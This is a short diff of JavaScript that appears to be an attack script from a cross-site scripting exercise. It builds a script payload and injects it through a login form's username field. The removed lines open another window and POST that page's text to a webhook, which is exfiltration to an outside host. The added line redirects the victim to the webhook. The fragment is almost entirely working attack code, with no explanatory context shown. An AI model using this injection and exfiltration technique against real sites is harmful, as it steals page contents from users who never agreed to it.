@@ -23,10 +23,7 @@ function openProfile() {
 window.open(PROFILE, OPEN);
 
 const payload = `
-const profile = window.open("", "${OPEN}");
-let xhr = new XMLHttpRequest();
-xhr.open("POST", "${WEBHOOK}", true);
-xhr.send(profile.document.body.innerText);
+document.location = "${WEBHOOK}?open";
 `;
 document.getElementById("username").value = `<script>${payload}</script>`;
 document.getElementById("login").submit();
